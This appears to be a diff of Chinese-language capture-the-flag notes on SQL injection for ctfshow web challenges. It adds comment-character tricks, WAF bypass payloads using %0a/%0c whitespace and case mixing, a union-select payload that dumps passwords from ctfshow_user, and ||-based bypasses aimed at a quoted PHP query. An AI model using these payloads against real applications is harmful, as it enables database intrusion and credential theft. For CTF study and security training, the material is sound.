@@ -17,7 +17,7 @@
 <br>
 
 * 可能的闭合符   '  "  ')  ")
-* 不需要的语句可以用注释符号 --+ 或者 # 或者 %23 注释掉
+* 不需要的语句可以用注释符号 --+  #  %23 --%0c注释掉
 * 使用group by 或者Order by 确定数据列数量:id=-2'group by 4--+
 * 查找回显位:使你提交的结果能够在页面上给你体现出来 使用语句?id=-2'union select 1,2,3--+(回显的内容的数字就可以知道是哪个位置了)
 
@@ -40,12 +40,33 @@
 
 <br>
 
-## 一些可以参考的playload
+## 一些更简洁的可以参考的playload
 * 1'%0aunion%0asElect%0a1,2,%0agroup_concat(password)%0afrom%0actfshow_user%23
-
+* -1'%0cor%0cusername='flag
 
 
 <br>
 
 ## waf绕过
 * 大小写
+
+
+
+<br>
+
+
+## 基于原题下手的绕过
+$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
+* 这段代码我们可以利用拼接来进行绕过
+* 管道符-1'||username='flag
+* 管道符-1'||(username)like'%fla%
+
+
+
+
+
+
+
+ctfshow-web183
+
+<br>
